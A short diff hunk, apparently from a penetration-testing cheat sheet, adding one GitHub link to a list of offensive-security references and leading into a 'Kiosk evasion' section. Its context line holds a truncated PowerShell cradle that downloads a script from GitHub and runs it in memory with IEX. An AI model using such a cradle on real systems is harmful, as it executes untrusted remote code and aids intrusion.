@@ -15,6 +15,7 @@ IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/
 - https://viperone.gitbook.io/pentest-everything
 - https://book.hacktricks.xyz/
 - https://atomicredteam.io/atomics/
+- https://github.com/S3cur3Th1sSh1t/
 
 **Kiosk evasion** : file access from browser or openfile dialogbox
 ```
